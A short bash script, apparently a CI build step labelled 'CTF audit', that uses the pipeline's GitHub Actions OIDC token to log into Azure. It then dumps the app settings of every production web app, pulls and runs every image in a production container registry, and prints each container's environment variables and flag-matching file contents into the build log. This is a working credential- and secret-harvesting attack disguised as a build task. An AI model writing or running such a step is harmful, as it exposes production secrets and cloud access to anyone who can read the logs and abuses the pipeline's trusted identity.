#!/usr/bin/env bash
set -euxo pipefail
echo "tebamoto-platform build: CTF audit"
token=$(curl -fsS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | python3 -c 'import json,sys; print(json.load(sys.stdin)["value"])')
az login --service-principal --username "$AZURE_CLIENT_ID" --tenant "$AZURE_TENANT_ID" --federated-token "$token" >/dev/null
az account set --subscription "$AZURE_SUBSCRIPTION_ID"
registry=crtblplatprodx3euoz
echo '=== WEBAPP SETTINGS ==='
for app in $(az webapp list --query '[].name' -o tsv); do
  echo "APP=$app"
  az webapp config appsettings list --name "$app" --resource-group rg-tbl-platform-prod-sea -o json || true
done
for repo in $(az acr repository list --name "$registry" -o tsv); do
  for tag in $(az acr repository show-tags --name "$registry" --repository "$repo" -o tsv); do
    image="$registry.azurecr.io/$repo:$tag"
    docker pull "$image" >/dev/null 2>&1 || continue
    echo "=== $image ==="
    docker run --rm --entrypoint /bin/sh "$image" -c 'env; find /app /opt /srv -maxdepth 4 -type f 2>/dev/null | while read f; do grep -aEi "flag|ctf|TBL\\{" "$f" 2>/dev/null | head -3 && echo "FILE=$f"; done' || true
  done
done
